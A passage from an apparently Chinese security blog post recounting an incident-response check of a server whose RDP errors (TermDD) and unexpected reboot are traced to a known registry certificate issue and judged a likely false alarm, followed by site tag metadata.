0x02进展行叭，那咋办嘛？真的就一行一行看呗，我想了一下，客户说服务器在半夜三点左右的时候被重启了一次，于是我就从那个时间附近找找敏感信息，两点左右的日志没敏感操作啊，继续往前看，还是无果，我决定换个思路。在我看第三遍的时候，我就开始怀疑这个了往回溯源还真就自动重启了呗这或许就能解释的通了，客户也突然放松了下来，但他又说了，里面有一些奇怪的ip地址啊进行远程桌面连接，这怎么解释呢？我一看还真是，全是外网ip地址，不会真是被挂vpn搞了吧 0x03意外状况我就查了一下介个TermDD是个啥，咱之前没遇见过，看这意思像是远程终端呀，难道是远程桌面连接啥的？本着不懂就别瞎jb说的原则，我百度了一下，全是没用的广告，接着我又Google一下，大佬是这样说的： RDP 协议组件 X.224 在协议流中发现一个错误并且中断了客户端连接。 事件类型: 错误 事件来源: TermDD 描述: RDP 的 “DATA ENCRYPTION” 协议组件在协议流中检测到一个错误并且中断了客户机。 出现该情况可能的原因如下： 1：有可能你的远程登陆组件出现问题，试试能否能继续远程登陆。 2：有人在攻击你，使用暴力破解的方法登陆你的系统，导致系统拒绝服务。 导致的后果就是计算机的远程桌面无法登录了，ping网关地址和外网地址全部正常，唯独远程桌面不能使用，仔细检查了各项服务，也没有发现异常，最后在网上找了很久，终于找到了解决办法！ 原来是注册表中的“Certificate”子键被损坏，才导致用户无法与终端服务进行正常通信。分析：Certificate子键负责终端服务通信中数据信息的认证和加密，它一旦被损坏，终端服务的协议组件就会检测到错误，中断客户机与终端服务器之间的通信。 解决方法： 打开注册表编辑器，找到HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters键值，将Certificate键值删除，然后直接重新启动服务器即可。服务器在重新启动后会自动创建该键我继续往前翻日志发现，18年以前也有这个问题，不止一处，这应该就是系统本身的问题。 分析用户组也没有发现有新增隐藏用户什么的，看到这儿我觉得十有八九是误报了，因为系统之前被搞过一次，又来的话客户可能是吓着了。也奉劝老表哥们还是注意点哦，如果再执迷不悟….. 0x04结束语事后和同事讨论，能搞到你内网的系统，应该很厉害的，既然拿到了你的系统权限，一般正常点都是隐藏痕迹，谁会明目张胆重启你系统引起你的注意呢？怎么想都不对是不是。因为同事对这个系统做过渗透，讲道理是这样的哈哈哈 参考链接[https://blog.csdn.net/gguxxing008/article/details/7755328]","link":"/2019/07/24/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86/"}],"tags":[{"name":"Android安全","slug":"Android安全","link":"/tags/Android%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"Web安全","link":"/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"信息收集","slug":"信息收集","link":"/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"工具手册","slug":"工具手册","link":"/tags/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"},{"name":"web安全","slug":"web安全","link":"/tags/web%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"python","link":"/tags/python/"}],"categories":[{"name":"渗透测试","slug":"渗透测试","link":"/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"安全研究","slug":"安全研究","link":"/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"},{"name":"网络","slug":"网络","link":"/categories/%E7%BD%91%E7%BB%9C/"},{"name":"生活日常","slug":"生活日常","link":"/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"},{"name":"开发","slug":"开发","link":"/categories/%E5%BC%80%E5%8F%91/"}]}